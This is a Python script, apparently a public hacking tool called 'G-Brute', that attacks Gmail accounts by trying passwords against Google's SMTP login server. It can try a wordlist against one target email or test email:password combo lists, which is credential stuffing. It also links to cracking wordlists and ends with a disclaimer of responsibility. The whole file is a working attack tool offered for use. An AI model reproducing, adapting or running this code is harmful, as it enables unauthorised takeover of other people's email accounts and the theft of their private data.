 #!usr/bin/python
# -*- coding: utf-8 -*-
import smtplib
import time
import sys
import os
class color:
   PURPLE = '\033[95m'
   CYAN = '\033[96m'
   WHITE = '\033[37m'
   DARKCYAN = '\033[36m'
   BLUE = '\033[94m'
   GREEN = '\033[92m'
   YELLOW = '\033[93m'
   RED = '\033[91m'
   BOLD = '\033[1m'
   HEADER = '\033[95m'
   OKBLUE = '\033[94m'
   OKGREEN = '\033[92m'
   WARNING = '\033[93m'
   FAIL = '\033[91m'
   UNDERLINE = '\033[4m'
   END = '\033[0m'
   COREGREEN = '\033[1;35;32m'
W  = '\033[0m'  # white (normal)
R  = '\033[31m' # red
G  = '\033[32m' # green
O  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[35m' # purple
C  = '\033[36m' # cyan
GR = '\033[37m' # gray
T  = '\033[93m' # tan
CG = '\033[1;35;32m' # magenta

			####################################################
			#		Creator: @sprx.sh						   #
			#		Do not leech this code, learn from it.	   #
			#		Sources: google.com for MIME and Colors :) #
			####################################################

banner = (color.CYAN + color.BOLD + '''
 ██████╗       ██████╗ ██████╗ ██╗   ██╗████████╗███████╗
██╔════╝       ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝
██║  ███╗█████╗██████╔╝██████╔╝██║   ██║   ██║   █████╗  
██║   ██║╚════╝██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  
╚██████╔╝      ██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗
 ╚═════╝       ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝
 		By: @sprx.sh | <3
 		''' + color.END)

os.system("clear")
print banner

print (color.YELLOW + color.BOLD + " ┌─────────────────────────────────────────────────────────────────┐")
print (color.YELLOW + color.BOLD + " │ " + color.RED + color.BOLD + "[1] " + color.WHITE + color.BOLD + "- Wordlist Bruteforce") + (color.RED + color.BOLD + "      [2] " + color.WHITE + color.BOLD + "- Email:Password Bruteforce" + color.YELLOW + color.BOLD + "  │ ")
print (color.YELLOW + color.BOLD + " │ " + color.RED + color.BOLD + "[3] " + color.WHITE + color.BOLD + "- Wordlist Links")   + (color.RED + color.BOLD + "           [4] " + color.WHITE + color.BOLD + "- Information" + color.YELLOW + color.BOLD + "                │ ")
print (color.YELLOW + color.BOLD + " │ " + color.RED + color.BOLD + "[5] " + color.WHITE + color.BOLD + "- Help")   + (color.RED + color.BOLD + "                         " + color.WHITE + color.BOLD + "             " + color.YELLOW + color.BOLD + "                │ ")
print (color.YELLOW + color.BOLD + " └─────────────────────────────────────────────────────────────────┘")

attackoption = raw_input(color.CYAN + color.BOLD + "[#] Attack Type: ")
print('')

#Wordlist Brutforce
def gmailwordlist():
  try:
    try:
      smptserver = smtplib.SMTP("smtp.gmail.com", 587)
      smptserver.ehlo()
      smptserver.starttls()
      print (color.WHITE + color.BOLD + "=-=-=-=-=-=-=-=|Target/Wordlist|=-=-=-=-=-=-=-=" + color.BOLD + color.COREGREEN)
      email = raw_input(color.CYAN + color.BOLD + "Email: ")
      passwordlist = raw_input(color.RED + color.BOLD + "Wordlist: ")
	  
      passwordlist = open(passwordlist, "r")

      for password in passwordlist:
        try:
            smptserver.login(email, password)
            print color.COREGREEN + "[#]" + " Password Found: %s" % password, "[#] Email: %s" % email, "\n"
            break;
        except smtplib.SMTPAuthenticationError:   
            print color.RED + "[Ω]" + "Trying Password: %s" % password
      time.sleep(1)
    except:
      print (color.RED + color.BOLD + "[!]" + color.CYAN + color.BOLD + "Password not Found") 
  except KeyboardInterrupt:
    print (color.RED + color.BOLD + "[!]" + color.CYAN + color.BOLD + "Ctrl + C Was Pressed")

#EMAIL:PASSWORD Bruteforce
def gmailemailpass(): 
  smptserver = smtplib.SMTP("smtp.gmail.com", 587)
  smptserver.ehlo()
  smptserver.starttls()
  print (color.WHITE + color.BOLD + "=-=-=-=-=-=-=-=|Wordlist|=-=-=-=-=-=-=-=" + color.BOLD + color.COREGREEN)
  try:
    WordList = raw_input(color.CYAN + color.BOLD + "Wordlist: ")
    print('')
    var = open(WordList, 'r').readlines()
    for line in var:
      line = line.strip()
      USERNAME, PASSWORD = line.split(":")
      try:
        smptserver.login(USERNAME, PASSWORD)
        print color.COREGREEN + "[#]" + "Password Found: %s" % line, "\n"
        break;
      except smtplib.SMTPAuthenticationError:
        print color.RED + "[!]" + "Incorrect Password: %s" % line,"\n"
  except KeyboardInterrupt:
    print (color.RED + color.BOLD + "[!]" + color.CYAN + color.BOLD + "Keyboard Interrupt")

def wordlistlinks():
	os.system('clear')
	print banner
	print (color.YELLOW + color.BOLD + " ┌─────────────────────────────────────────────────────────────────┐")
	print (color.YELLOW + color.BOLD + " │ " + color.RED + color.BOLD + "[1] " + color.WHITE + color.BOLD + "- https://www.skidbin.net/paste?t=deATXU - Text") + (color.YELLOW + color.BOLD + "             │ ")
	print (color.YELLOW + color.BOLD + " │ " + color.RED + color.BOLD + "[2] " + color.WHITE + color.BOLD + "- https://crackstation.net/files/crackstation.txt.gz - 15GB") + (color.YELLOW + color.BOLD + " │ ")
	print (color.YELLOW + color.BOLD + " └─────────────────────────────────────────────────────────────────┘")

	

def help():
	os.system('clear')
	print banner
	print (color.YELLOW + color.BOLD + " ┌─────────────────────────────────────────────────────────────────┐")
	print (color.YELLOW + color.BOLD + " │ " + color.RED + color.BOLD + "[Usage] " + color.WHITE + color.BOLD + "- sudo python GBrute.py") + (color.YELLOW + color.BOLD + "                                 │ ")
	print (color.YELLOW + color.BOLD + " │ " + color.RED + color.BOLD + "[Password Not Found] " + color.WHITE + color.BOLD + "- Did you type the email/wordlist correct?") + (color.YELLOW + color.BOLD + " │ ")
	print (color.YELLOW + color.BOLD + " │ " + color.RED + color.BOLD + "[Coding Errors] " + color.WHITE + color.BOLD + "- You or Someone else messed with the code :/") + (color.YELLOW + color.BOLD + "   │ ")
	print (color.YELLOW + color.BOLD + " │ " + color.RED + color.BOLD + "[Updater] " + color.WHITE + color.BOLD + "- https://github.com/sprxsh/gmailbruteforcer") + (color.YELLOW + color.BOLD + "          │ ")
	print (color.YELLOW + color.BOLD + " └─────────────────────────────────────────────────────────────────┘")

def information():
	os.system('clear')
	print banner
	print (color.YELLOW + color.BOLD + " ┌─────────────────────────────────────────────────────────────────┐")
	print (color.YELLOW + color.BOLD + " │ " + color.RED + color.BOLD + "[Instagram] " + color.WHITE + color.BOLD + "- https://www.instagram.com/sprx.sh/") + (color.YELLOW + color.BOLD + "                │ ")
	print (color.YELLOW + color.BOLD + " │ " + color.RED + color.BOLD + "[Discord] " + color.WHITE + color.BOLD + "- SQLFail#6868") + (color.YELLOW + color.BOLD + "                                        │ ")
	print (color.YELLOW + color.BOLD + " │ " + color.RED + color.BOLD + "[Version] " + color.WHITE + color.BOLD + "- v1 - Public Release :)") + (color.YELLOW + color.BOLD + "                              │ ")
	print (color.YELLOW + color.BOLD + " │ " + color.RED + color.BOLD + "[Protection] " + color.WHITE + color.BOLD + "- I (@SPRX.SH) AM NOT RESPONSIBLE FOR WHAT YOU DO") + (color.YELLOW + color.BOLD + "  │ ")
	print (color.YELLOW + color.BOLD + " └─────────────────────────────────────────────────────────────────┘")
	
#Attack Options  
if attackoption == '1':
  gmailwordlist() 
elif attackoption == '2':
  gmailemailpass()
elif attackoption == '3':
  wordlistlinks()
elif attackoption == '4':
  information()
elif attackoption == '5':
  help()
else:
  print (color.RED + color.BOLD + "[!]" + color.CYAN + color.BOLD + "Invalid Option")
